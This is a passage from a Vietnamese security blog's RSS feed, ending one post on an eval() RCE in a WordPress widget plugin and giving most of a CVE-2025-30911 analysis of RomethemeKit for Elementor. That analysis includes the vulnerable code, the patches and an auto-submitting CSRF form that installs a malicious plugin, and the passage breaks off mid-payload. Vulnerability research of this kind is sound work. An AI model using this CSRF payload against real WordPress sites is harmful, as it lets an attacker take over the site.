&lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; tr√™n server.&lt;/p&gt;&#xA;&lt;p&gt;M·∫∑c d√π c√°c phi√™n b·∫£n sau ƒë√£ b·ªï sung c∆° ch·∫ø ki·ªÉm tra bi·ªÉu th·ª©c (expression validation), nh∆∞ng nguy√™n nh√¢n g·ªëc v·∫´n n·∫±m ·ªü vi·ªác &lt;strong&gt;tin t∆∞·ªüng d·ªØ li·ªáu logic ch∆∞a ƒë∆∞·ª£c l·ªçc&lt;/strong&gt; v√† cho ph√©p th·ª±c thi ƒë·ªông b·∫±ng &lt;code&gt;eval()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Tuy·ªát ƒë·ªëi &lt;strong&gt;kh√¥ng truy·ªÅn d·ªØ li·ªáu do ng∆∞·ªùi d√πng ki·ªÉm so√°t v√†o &lt;code&gt;eval()&lt;/code&gt;&lt;/strong&gt;, k·ªÉ c·∫£ trong c√°c t√≠nh nƒÉng ‚Äúlogic‚Äù hay ‚Äúƒëi·ªÅu ki·ªán‚Äù.&lt;/li&gt;&#xA;&lt;li&gt;T·∫•t c·∫£ thu·ªôc t√≠nh c·ªßa block / widget ph·∫£i ƒë∆∞·ª£c &lt;strong&gt;x√°c th·ª±c (validate) v√† l√†m s·∫°ch (sanitize)&lt;/strong&gt; nghi√™m ng·∫∑t tr∆∞·ªõc khi s·ª≠ d·ª•ng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Quy·ªÅn Contributor v·∫´n c√≥ th·ªÉ r·∫•t nguy hi·ªÉm&lt;/strong&gt; n·∫øu k·∫øt h·ª£p v·ªõi c√°c c∆° ch·∫ø th·ª±c thi m√£ kh√¥ng an to√†n ·ªü ph√≠a server.&lt;/li&gt;&#xA;&lt;li&gt;Tr√°nh th·ª±c thi m√£ ƒë·ªông; thay v√†o ƒë√≥ h√£y s·ª≠ d·ª•ng &lt;strong&gt;parser an to√†n&lt;/strong&gt; ho·∫∑c &lt;strong&gt;danh s√°ch tr·∫Øng (whitelist) c√°c bi·ªÉu th·ª©c h·ª£p l·ªá&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/widget-options/vulnerability/wordpress-widget-options-plugin-4-0-7-authenticated-contributor-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Options Plugin &amp;lt;= 4.0.7 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30911 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-03-cve-2025-30911/</link>
      <pubDate>Wed, 03 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-03-cve-2025-30911/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-03-cve-2025-30911/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; trong &lt;strong&gt;Rometheme RomethemeKit For Elementor&lt;/strong&gt; cho ph√©p x·∫£y ra &lt;strong&gt;Command Injection&lt;/strong&gt;. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;RomethemeKit For Elementor&lt;/strong&gt; t·ª´ n/a ƒë·∫øn phi√™n b·∫£n &lt;strong&gt;1.5.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30911&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30911&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.5.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subcriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;RTMKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.5.3&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.5.5&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;L·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë x·∫£y ra ƒë·∫øn phi√™n b·∫£n &lt;strong&gt;1.5.4&lt;/strong&gt; nh∆∞ng th·ª±c s·ª± n√≥ ƒë√£ ƒë∆∞·ª£c v√° m·ªôt ph·∫ßn trong phi√™n b·∫£n n√†y, n√™n t√¥i ch·ªçn phi√™n b·∫£n &lt;strong&gt;1.5.3&lt;/strong&gt; ƒë·ªÉ ph√¢n t√≠ch&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v1.5.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function install_requirements()&#xA;{&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/plugin.php&amp;#39;;&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39;;&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/misc.php&amp;#39;;&#xA;    include_once ABSPATH . &amp;#39;wp-admin/includes/class-wp-upgrader.php&amp;#39;;&#xA;&#xA;    $plugin = $_POST[&amp;#39;plugin&amp;#39;];&#xA;    $plugin_file = WP_PLUGIN_DIR . &amp;#39;/&amp;#39; . $plugin;&#xA;    $plugin_slug = dirname($plugin);&#xA;&#xA;    if (file_exists($plugin_file)) {&#xA;        // Activate the plugin if already installed but inactive&#xA;        ob_start();&#xA;        activate_plugin($plugin);&#xA;        ob_clean();&#xA;        ob_end_clean();&#xA;        wp_send_json_success(&amp;#34;Install and Activate Successfully&amp;#34;);&#xA;    } else {&#xA;        ob_start();&#xA;        $plugin_download_url = &amp;#34;https://downloads.wordpress.org/plugin/{$plugin_slug}.latest-stable.zip&amp;#34;; // Adjust URL structure&#xA;        $upgrader = new \Plugin_Upgrader();&#xA;        $result = $upgrader-&amp;gt;install($plugin_download_url);&#xA;&#xA;        if (is_wp_error($result)) {&#xA;            wp_send_json_error();&#xA;        }&#xA;        $activate_result = activate_plugin($plugin);&#xA;        if (is_wp_error($activate_result)) {&#xA;            wp_send_json_error(&amp;#39;Plugin installed but failed to activate: &amp;#39; . $activate_result-&amp;gt;get_error_message());&#xA;        }&#xA;&#xA;        wp_send_json_success(&amp;#39;Plugin installed and activated successfully.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;install_requirements()&lt;/code&gt; cho ph√©p t·∫£i v√† k√≠ch ho·∫°t plugin d·ª±a tr√™n gi√° tr·ªã c·ªßa &lt;code&gt;$_POST[&#39;plugin&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu plugin ƒë√£ t·∫£i m√† ch∆∞a active th√¨ th·ª±c hi·ªán active:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (file_exists($plugin_file)) {&#xA;    // Activate the plugin if already installed but inactive&#xA;    ob_start();&#xA;    activate_plugin($plugin);&#xA;    ob_clean();&#xA;    ob_end_clean();&#xA;    wp_send_json_success(&amp;#34;Install and Activate Successfully&amp;#34;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu plugin ch∆∞a t·∫£i th√¨ th·ª±c hi·ªán t·∫£i n√≥ v·ªÅ&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhi√™n, h√†m n√†y kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng n√†o.&lt;/p&gt;&#xA;&lt;p&gt;Sang phi√™n b·∫£n &lt;code&gt;v1.5.4&lt;/code&gt;, nh√† ph√°t tri·ªÉn ƒë√£ v√° m·ªôt ph·∫ßn b·∫±ng c√°ch th√™m ƒëo·∫°n:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; l√† quy·ªÅn ch·ªâ d√†nh cho &lt;strong&gt;Administrator&lt;/strong&gt;, v√¨ v·∫≠y gi·ªù ƒë√¢y ch·ªâ t√†i kho·∫£n Admin m·ªõi c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c ch·ª©c nƒÉng n√†y. Vi·ªác n√†y ƒë√£ ngƒÉn ƒë∆∞·ª£c user th√¥ng th∆∞·ªùng (&lt;strong&gt;Subscriber&lt;/strong&gt;, &lt;strong&gt;Author&lt;/strong&gt;, v.v.) v√† ng∆∞·ªùi kh√¥ng ƒëƒÉng nh·∫≠p tr·ª±c ti·∫øp khai th√°c l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, b·∫£n v√° n√†y v·∫´n ch∆∞a ƒë·ªß an to√†n. V√¨ sao?&lt;/p&gt;&#xA;&lt;p&gt;M·∫∑c d√π ƒë√£ gi·ªõi h·∫°n quy·ªÅn l√† &lt;strong&gt;Administrator&lt;/strong&gt;, nh∆∞ng h√†m n√†y kh√¥ng c√≥ c∆° ch·∫ø ch·ªëng &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;N·∫øu &lt;strong&gt;Administrator&lt;/strong&gt; ƒëang ƒëƒÉng nh·∫≠p v√†o website WordPress v√† truy c·∫≠p v√†o m·ªôt trang web ƒë·ªôc h·∫°i do attacker ki·ªÉm so√°t th√¨ trang ƒë√≥ c√≥ th·ªÉ b√≠ m·∫≠t g·ª≠i m·ªôt request (POST) t·ªõi &lt;code&gt;install_requirements&lt;/code&gt; request n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán v·ªõi quy·ªÅn c·ªßa &lt;strong&gt;Administrator&lt;/strong&gt;, v√¨ tr√¨nh duy·ªát ƒëang mang theo cookie ƒëƒÉng nh·∫≠p.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;ƒê·∫øn phi√™n b·∫£n &lt;strong&gt;v1.5.5&lt;/strong&gt;, nh√† ph√°t tri·ªÉn m·ªõi th·ª±c s·ª± v√° ho√†n ch·ªânh l·ªó h·ªïng b·∫±ng c√°ch th√™m ki·ªÉm tra nonce:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!isset($_POST[&amp;#39;wpnonce&amp;#39;]) ||  !wp_verify_nonce($_POST[&amp;#39;wpnonce&amp;#39;], &amp;#39;rtm_template_nonce&amp;#39;)) {&#xA;    wp_send_json_error(&amp;#39;Access Denied&amp;#39;);&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi k·∫øt h·ª£p c·∫£ hai l·ªõp b·∫£o v·ªá:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; ‚Üí ki·ªÉm tra quy·ªÅn&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_verify_nonce()&lt;/code&gt; ‚Üí ch·ªëng CSRF&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Th√¨ l·ªó h·ªïng m·ªõi ƒë∆∞·ª£c v√° ƒë√∫ng c√°ch.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt ajax d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (&lt;code&gt;wp_ajax_&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_install_requirements&amp;#39;, [$this, &amp;#39;install_requirements&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy c·∫≠p ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi &lt;code&gt;action=install_requirements&lt;/code&gt; th√¨ callback &lt;code&gt;install_requirements&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Administrator is logged in to the WordPress site&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Administrator visits a malicious website controlled by the attacker&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Browser automatically includes Administrator cookies&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;WordPress treats the request as coming from an authenticated Admin&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;install_requirements() is executed without nonce validation&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Untrusted $_POST[&amp;#39;plugin&amp;#39;] is processed&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Plugin_Upgrader-&amp;gt;install()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;activate_plugin()&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Malicious plugin is installed and activated&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o trang web ch·ª©a payload v√† g·ª≠i cho Administrator:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&#xA;  &amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;action&amp;#34; value=&amp;#34;install&amp;amp;#95;requirements&amp;#34; /&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;plugin&amp;#34; value=&amp;#34;malicious&amp;amp;#95;plugin&amp;amp;#47;malicious&amp;amp;#95;plugin&amp;amp;#95;dir&amp;amp;#46;php&amp;#34; /&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit request&amp;#34; /&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;      history.pushState(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;/&amp;#39;);&#xA;      document.forms[0].submit();&#xA;    &amp;lt;/script&amp;gt;&#xA;  